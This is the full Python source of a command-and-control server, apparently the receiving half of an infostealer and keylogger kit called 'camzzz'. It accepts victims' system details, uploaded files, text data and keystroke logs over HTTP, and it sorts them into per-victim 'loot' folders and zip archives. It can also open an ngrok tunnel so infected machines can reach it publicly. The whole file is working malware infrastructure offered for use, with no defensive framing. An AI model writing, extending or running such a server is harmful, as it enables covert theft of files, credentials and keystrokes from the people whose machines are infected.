#!/usr/bin/env python3
# camzzz C2 Server — run this on YOUR machine
# Receives everything from victims, saves in loot/<hostname>/
# Optional: ngrok tunnel for public access (no port forwarding needed)

import os, sys, json, subprocess, threading, base64, zipfile
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

PORT     = 8080
LOOT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "loot")
os.makedirs(LOOT_DIR, exist_ok=True)

# colors
R  = "\033[91m"; G  = "\033[92m"; Y  = "\033[93m"
C  = "\033[96m"; W  = "\033[97m"; M  = "\033[95m"; SR = "\033[0m"

victims = {}  # hostname -> info

def log(color, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"{color}[{ts}] {msg}{SR}")

def victim_dir(hostname):
    folder = os.path.join(LOOT_DIR, hostname)
    os.makedirs(folder, exist_ok=True)
    return folder

class C2Handler(BaseHTTPRequestHandler):

    def log_message(self, fmt, *args):
        pass  # silence default access logs

    def _respond(self, code=200, body=b"OK"):
        self.send_response(code)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        path    = urlparse(self.path).path
        length  = int(self.headers.get("Content-Length", 0))
        raw     = self.rfile.read(length) if length else b""
        host    = self.headers.get("X-Victim", "unknown").strip()
        host    = "".join(c for c in host if c.isalnum() or c in "-_.")

        # ── /ping ─ victim first contact ──────────────────────────────────────
        if path == "/ping":
            try:
                data = json.loads(raw)
                victims[host] = data
                folder = victim_dir(host)
                info_path = os.path.join(folder, "sysinfo.txt")
                with open(info_path, "w", encoding="utf-8") as f:
                    f.write("=" * 44 + "\n")
                    f.write(f"  camzzz C2 — VICTIM: {host}\n")
                    f.write("=" * 44 + "\n")
                    for k, v in data.items():
                        f.write(f"{k:<16}: {v}\n")
                    f.write(f"\nConnected: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                log(R, f"NEW VICTIM ★  {host}")
                log(W, f"  User   : {data.get('user','?')}")
                log(W, f"  OS     : {data.get('os','?')}")
                log(W, f"  IP     : {data.get('local_ip','?')} (public: {data.get('public_ip','?')})")
                log(W, f"  Admin  : {data.get('admin','?')}")
                log(G, f"  Saved  : {info_path}")
            except Exception as e:
                log(Y, f"[ping parse error] {e}")
            self._respond()

        # ── /upload ─ receive any file ─────────────────────────────────────────
        elif path == "/upload":
            fname   = self.headers.get("X-Filename", "file.bin").strip()
            fname   = "".join(c for c in fname if c.isalnum() or c in "._- ")
            folder  = victim_dir(host)
            out     = os.path.join(folder, fname)
            with open(out, "wb") as f:
                f.write(raw)
            size_kb = len(raw) // 1024 or 1
            log(C, f"[{host}] received {fname}  ({size_kb} KB)")
            self._respond()

        # ── /text ─ receive text data ──────────────────────────────────────────
        elif path == "/text":
            fname  = self.headers.get("X-Filename", "data.txt").strip()
            folder = victim_dir(host)
            out    = os.path.join(folder, fname)
            with open(out, "wb") as f:
                f.write(raw)
            log(C, f"[{host}] received {fname}  ({len(raw)} bytes)")
            self._respond()

        # ── /keylog ─ append keylog chunk ─────────────────────────────────────
        elif path == "/keylog":
            folder = victim_dir(host)
            out    = os.path.join(folder, "keylog.txt")
            ts     = datetime.now().strftime("[%H:%M:%S] ")
            with open(out, "ab") as f:
                f.write(ts.encode() + raw + b"\n")
            log(M, f"[{host}] keylog chunk  ({len(raw)} bytes)")
            self._respond()

        # ── /done ─ victim finished collection ────────────────────────────────
        elif path == "/done":
            folder  = victim_dir(host)
            zip_out = folder + ".zip"
            with zipfile.ZipFile(zip_out, "w", zipfile.ZIP_DEFLATED) as zf:
                for fname in os.listdir(folder):
                    zf.write(os.path.join(folder, fname), fname)
            sz = os.path.getsize(zip_out) // 1024
            log(G, f"[{host}] collection done → {zip_out}  ({sz} KB)")
            self._respond()

        else:
            self._respond(404, b"Not found")

    def do_GET(self):
        # Health check
        self._respond(200, b"C2 online")


def show_victims():
    """Print current victim list."""
    if not victims:
        print(f"{Y}  No victims yet.{SR}")
        return
    print(f"\n{C}  {'Hostname':<20} {'User':<15} {'OS':<30} {'IP'}{SR}")
    print(f"  {'-'*75}")
    for h, d in victims.items():
        print(f"  {h:<20} {d.get('user','?'):<15} {d.get('os','?')[:28]:<30} {d.get('local_ip','?')}")


def start_ngrok(port):
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyngrok",
                               "--quiet", "--break-system-packages"],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        from pyngrok import ngrok
        token = input(f"  {C}ngrok auth token (ngrok.com/dashboard, free): {SR}").strip()
        if token:
            ngrok.set_auth_token(token)
        tunnel = ngrok.connect(port, "http")
        url = tunnel.public_url.replace("http://", "https://")
        log(G, f"ngrok tunnel: {url}")
        return url
    except Exception as e:
        log(R, f"ngrok failed: {e}")
        return None


def main():
    os.system("cls" if os.name == "nt" else "clear")
    print(f"""{M}
╔══════════════════════════════════════════════════════╗
║              camzzz C2 Server                       ║
║  Receives data from victims — saves in loot/        ║
╚══════════════════════════════════════════════════════╝{SR}
""")
    print(f"  {C}[1]{SR} Local only  (LAN / same network, or port-forward)")
    print(f"  {C}[2]{SR} ngrok tunnel (public URL, no port-forward needed)\n")
    mode = input("  Mode [1/2]: ").strip()

    public_url = f"http://YOUR_IP:{PORT}"

    if mode == "2":
        public_url = start_ngrok(PORT) or public_url

    server = HTTPServer(("0.0.0.0", PORT), C2Handler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()

    local_ip = "127.0.0.1"
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
    except: pass

    print(f"\n{G}[+] C2 Server running{SR}")
    print(f"  Local  : http://{local_ip}:{PORT}")
    print(f"  Public : {public_url}")
    print(f"  Loot   : {LOOT_DIR}")
    print(f"\n{Y}  Use this URL when building your payload:{SR}")
    print(f"  {W}{public_url}{SR}")
    print(f"\n{C}  Commands: [v] victims  [l] list loot  [q] quit{SR}\n")

    while True:
        try:
            cmd = input().strip().lower()
            if cmd == "v":
                show_victims()
            elif cmd == "l":
                for name in os.listdir(LOOT_DIR):
                    fp = os.path.join(LOOT_DIR, name)
                    if os.path.isdir(fp):
                        files = os.listdir(fp)
                        print(f"  {G}{name}{SR}  ({len(files)} files)")
                    elif name.endswith(".zip"):
                        sz = os.path.getsize(fp) // 1024
                        print(f"  {C}{name}{SR}  ({sz} KB zip)")
            elif cmd == "q":
                break
        except (KeyboardInterrupt, EOFError):
            break

    server.shutdown()
    print(f"\n{Y}[*] Server stopped.{SR}")

if __name__ == "__main__":
    main()
